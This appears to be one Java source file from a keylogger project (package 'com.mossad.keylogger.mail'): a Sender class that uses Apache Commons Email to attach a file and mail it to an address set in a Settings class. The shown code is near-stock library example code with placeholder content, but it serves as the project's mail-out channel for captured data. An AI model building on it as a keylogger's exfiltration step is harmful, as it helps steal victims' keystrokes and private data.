package com.mossad.keylogger.mail;

import org.apache.commons.mail.EmailAttachment;
import org.apache.commons.mail.EmailException;
import org.apache.commons.mail.MultiPartEmail;

public final class Sender {

    private EmailAttachment attachment;
    private MultiPartEmail email;

    public Sender(){

    }

    public void prepare() throws EmailException {
        // Create the attachment
        attachment = new EmailAttachment();
        attachment.setPath("mypictures/john.jpg");
        attachment.setDisposition(EmailAttachment.ATTACHMENT);
        attachment.setDescription("Picture of John");
        attachment.setName("John");

        // Create the email message
        email = new MultiPartEmail();
        email.setHostName(Settings.MAIL_HOST_NAME);
        email.addTo(Settings.to, "John Doe");
        email.setFrom(Settings.from, "Me");
        email.setSubject("The picture");
        email.setMsg("Here is the picture you wanted");

        // add the attachment
        email.attach(attachment);
    }

    public void send() throws EmailException {
        email.send();
    }
}
